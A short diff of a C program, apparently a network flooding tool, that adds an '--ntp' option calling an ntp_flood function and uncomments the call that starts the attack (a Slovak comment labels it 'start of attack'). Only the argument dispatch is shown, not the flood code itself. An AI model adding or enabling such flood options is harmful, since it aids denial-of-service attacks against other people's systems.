@@ -147,6 +147,10 @@ int main(int argc, char **argv)
 		{
 			sshPass(flood_argc + 1, flood_argv);
 		}
+        else if (strcmp(flood_type, "--ntp") == 0)
+        {
+            ntp_flood(flood_argc + 1, flood_argv);
+        }
 		else
 		{
 			print_help_and_die();
@@ -163,7 +167,7 @@ int main(int argc, char **argv)
 	}//*/
 
 	// Zahájenie útoku
-	//start_attack(dev, proc_num_str); //pps_str
+	start_attack(dev, proc_num_str); //pps_str
 }
 
 
